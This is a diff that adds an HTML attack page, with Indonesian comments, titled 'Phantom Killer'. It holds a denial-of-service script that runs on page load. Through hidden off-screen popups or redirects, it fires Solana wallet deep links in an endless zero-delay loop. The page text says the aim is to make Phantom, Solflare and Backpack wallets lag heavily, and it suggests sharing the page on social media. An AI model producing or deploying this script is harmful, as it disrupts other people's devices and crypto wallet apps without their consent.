@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <title>SOLANA DEEP LINK DoS — Phantom Killer</title>
+  <style>
+    body {
+      background: #000;
+      color: #0f0;
+      font-family: 'Courier New', monospace;
+      text-align: center;
+      padding: 50px;
+    }
+    h1 { font-size: 3em; text-shadow: 0 0 20px #0f0; }
+    .warning { color: #f00; font-size: 1.5em; margin: 30px; }
+    .info { margin: 20px; font-size: 1.2em; }
+  </style>
+</head>
+<body>
+  <h1>SOLANA DoS ACTIVE</h1>
+  <div class="warning">Phantom / Solflare / Backpack akan LAG BERAT!</div>
+  <div class="info">Buka di Instagram/FB/Twitter → wallet akan spam connect request!</div>
+
+  <script>
+    // Solana Deep Link DoS — ZERO DELAY LOOP
+    function solanaDoS() {
+      // Ganti dengan wallet target (bisa phantom, solflare, backpack)
+      const deeplink = "solana:connect?referrer=app.phantom://";
+
+      // Coba buka di popup
+      const w = window.open(deeplink, "_blank", "width=1,height=1,left=-9999,top=-9999");
+
+      // Jika popup diblokir → langsung redirect
+      if (!w || w.closed || typeof w.closed === "undefined") {
+        location.href = deeplink;
+      }
+
+      // LOOP TANPA DELAY (setTimeout 0 = fastest possible)
+      setTimeout(solanaDoS, 0);
+    }
+
+    // Jalankan saat halaman load
+    window.onload = solanaDoS;
+  </script>
+</body>
+</html>
